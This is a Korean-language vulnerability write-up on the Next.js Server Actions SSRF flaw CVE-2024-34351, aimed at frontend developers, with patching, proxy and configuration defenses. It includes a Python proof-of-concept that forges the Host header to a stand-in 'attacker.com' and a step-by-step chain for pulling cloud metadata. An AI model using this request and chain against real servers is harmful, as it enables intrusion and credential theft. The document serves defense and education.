# CVE-2024-34351 - Next.js Server-Side Request Forgery

## 개요

| 항목 | 내용 |
|------|------|
| CVE ID | CVE-2024-34351 |
| CVSS | 7.5 (High) |
| 영향 패키지 | next |
| 영향 버전 | 13.4.0 ~ 14.1.0 |
| 수정 버전 | 14.1.1 |
| 공격 유형 | SSRF (Server-Side Request Forgery) |
| 발견일 | 2024-05-09 |

## 왜 프론트엔드 개발자가 알아야 하는가

Next.js는 React 생태계의 사실상 표준 풀스택 프레임워크다. App Router의 Server Actions는 프론트엔드 개발자가 직접 작성하는 서버사이드 코드이며, 이 취약점은 Server Actions를 사용하는 모든 Next.js 애플리케이션에 영향을 미친다.

- **App Router 사용자 전체가 잠재적 영향 범위**
- Server Actions에서 `redirect()`를 사용하는 모든 코드
- self-hosted Next.js 환경에서 특히 위험 (Vercel 호스팅은 일부 완화)

이 취약점은 Assetnote의 연구팀이 발견했으며, 공개된 PoC(Proof of Concept)가 존재하여 실제 악용이 용이하다.

## 취약점 기술 분석

Next.js Server Actions에서 `redirect()` 함수가 호출되면, 내부적으로 서버가 해당 URL을 fetch하여 클라이언트에 결과를 전달한다. 이때 `Host` 헤더를 검증 없이 신뢰하여, 공격자가 Host 헤더를 변조하면 내부 서비스로의 SSRF가 가능하다.

```javascript
// Next.js 내부 동작 (단순화)
// Server Action에서 redirect()가 호출되면:

async function handleServerAction(request) {
  // ...action 실행...
  
  // redirect 응답 처리 시
  const host = request.headers.get('Host'); // 공격자가 제어 가능!
  const redirectUrl = `http://${host}${actionRedirectPath}`;
  
  // Next.js 서버가 이 URL을 직접 fetch
  const response = await fetch(redirectUrl);
  // → Host 헤더가 변조되면 임의 서버에 요청 전송!
}
```

핵심은 Next.js 서버가 클라이언트의 `Host` 헤더를 신뢰하여 내부적으로 HTTP 요청의 대상을 결정한다는 것이다.

## 공격 시나리오

```python
# 공격자의 Python 스크립트 (PoC)
import requests

# Next.js Server Action을 트리거하되, Host 헤더를 변조
response = requests.post(
    'https://target-nextjs-app.com/action-endpoint',
    headers={
        'Host': 'attacker.com',  # Host 헤더 변조
        'Next-Action': 'action-id',
        'Content-Type': 'text/plain;charset=UTF-8',
    },
    data='[]'
)

# Next.js 서버가 attacker.com으로 내부 요청을 보냄
# 공격자는 attacker.com에서 리다이렉트로 내부 서비스 응답을 받을 수 있음
```

실전 SSRF 체인:
1. 공격자가 Host 헤더를 자신의 서버로 변조하여 Server Action 호출
2. 공격자 서버가 302 리다이렉트로 내부 서비스 URL 반환 (예: `http://169.254.169.254/`)
3. Next.js 서버가 해당 내부 URL을 fetch하여 응답을 공격자에게 전달
4. AWS 메타데이터, 내부 API 데이터 등 탈취 성공

## 방어 방법

### 즉시 조치
```bash
npm install next@14.1.1
# 또는 최신 버전으로 업데이트
npm install next@latest
```

### 인프라 레벨 방어
```nginx
# Nginx 리버스 프록시에서 Host 헤더 강제 설정
server {
    location / {
        proxy_pass http://nextjs-app:3000;
        proxy_set_header Host $server_name;  # 원본 Host 무시
        proxy_set_header X-Forwarded-Host $host;
    }
}
```

### 코드 레벨 방어
```javascript
// next.config.js - 허용 호스트 명시
/** @type {import('next').NextConfig} */
const nextConfig = {
  // 실험적 기능으로 허용 origin 제한
  experimental: {
    serverActions: {
      allowedOrigins: ['myapp.com', 'www.myapp.com'],
    },
  },
};

module.exports = nextConfig;
```

### 장기 전략
- **Vercel 호스팅 사용 시**: Vercel의 엣지 네트워크가 Host 헤더를 정규화하므로 위험 완화
- **self-hosted 환경**: 리버스 프록시에서 Host 헤더를 반드시 고정
- Server Actions에서 외부 리다이렉트 시 URL 검증 추가
- IMDSv2 (Instance Metadata Service v2) 활성화로 메타데이터 SSRF 영향 제한

## 교훈 & 프론트엔드 적용 포인트

1. **프레임워크가 생성하는 서버 코드도 취약할 수 있다**: Server Actions는 프론트엔드 코드처럼 보이지만 서버에서 실행된다.
2. **Host 헤더는 신뢰할 수 없다**: 클라이언트가 보내는 모든 HTTP 헤더는 조작 가능하다.
3. **self-hosted vs managed의 보안 차이를 이해하라**: Vercel 같은 관리형 플랫폼은 추가 보안 레이어를 제공한다.
4. **SSRF 방어는 다층적이어야 한다**: 애플리케이션 레벨 + 인프라 레벨 + 네트워크 레벨 방어를 조합하라.
5. **PoC가 공개된 취약점은 즉시 패치하라**: CVE-2024-34351은 공개된 익스플로잇이 있어 실제 악용 위험이 높다.

## 참고 자료

- [NVD - CVE-2024-34351](https://nvd.nist.gov/vuln/detail/CVE-2024-34351)
- [GitHub Advisory - GHSA-fr5h-rqp8-mj6g](https://github.com/advisories/GHSA-fr5h-rqp8-mj6g)
- [Assetnote Research - Next.js SSRF](https://www.assetnote.io/resources/research/advisory-next-js-ssrf-cve-2024-34351)
- [PoC Repository](https://github.com/azu/nextjs-CVE-2024-34351)
- [Next.js Security](https://nextjs.org/docs/architecture/security)
